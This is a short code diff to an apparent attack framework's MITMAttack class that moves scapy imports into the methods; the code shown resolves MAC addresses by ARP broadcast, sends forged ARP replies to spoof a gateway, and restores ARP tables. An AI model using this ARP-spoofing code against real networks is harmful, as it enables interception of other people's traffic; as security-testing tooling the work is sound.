@@ -1,4 +1,3 @@
-from scapy.all import ARP, Ether, send, srp
 import time
 from .attack_base import AttackBase
 from ..utils.logger import setup_logger
@@ -53,6 +52,7 @@ class MITMAttack(AttackBase):
     def _get_mac(self, ip):
         """Get MAC address for IP"""
         try:
+            from scapy.all import ARP, Ether, srp
             arp_request = ARP(pdst=ip)
             broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
             arp_request_broadcast = broadcast/arp_request
@@ -67,11 +67,13 @@ class MITMAttack(AttackBase):
     
     def _spoof(self, target_ip, spoof_ip, target_mac):
         """Send spoofed ARP reply"""
+        from scapy.all import ARP, send
         packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         send(packet, verbose=False)
     
     def _restore(self, target_ip, gateway_ip, target_mac, gateway_mac):
         """Restore original ARP tables"""
+        from scapy.all import ARP, send
         logger.info("Restoring ARP tables")
         
         # Restore target
